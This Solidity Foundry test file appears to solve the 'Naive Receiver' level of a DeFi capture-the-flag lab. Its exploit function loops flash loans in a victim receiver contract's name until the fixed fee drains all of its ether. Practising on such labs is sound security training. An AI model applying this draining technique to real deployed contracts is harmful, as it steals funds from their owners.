// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        console.log(msg.sender);
        // 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38
        console.log(msg.sender.balance);
        // 79228162514264337593543950335
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        // console.log(address(users[0]).balance);

        vm.label(user, "User");
        vm.label(attacker, "Attacker");
        // console.log(address(attacker).balance);

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(
            address(naiveReceiverLenderPool),
            "Naive Receiver Lender Pool"
        );
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        // The only thing you need to do is to use up the receiver's balance.
        // uint256 flashFee = naiveReceiverLenderPool.fixedFee();
        vm.startPrank(attacker); // prank the person
        while (true) {
            // start loop
            // calculate the falshAmount
            uint256 flashAmount = 1000 ether;
            naiveReceiverLenderPool.flashLoan(
                address(flashLoanReceiver),
                flashAmount
            );

            if (address(flashLoanReceiver).balance == 0) {
                console.log(
                    "Receiver's value is: ",
                    address(flashLoanReceiver).balance,
                    "-> This is OK"
                );
                break;
            }
        }
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(
            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
        );
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
}
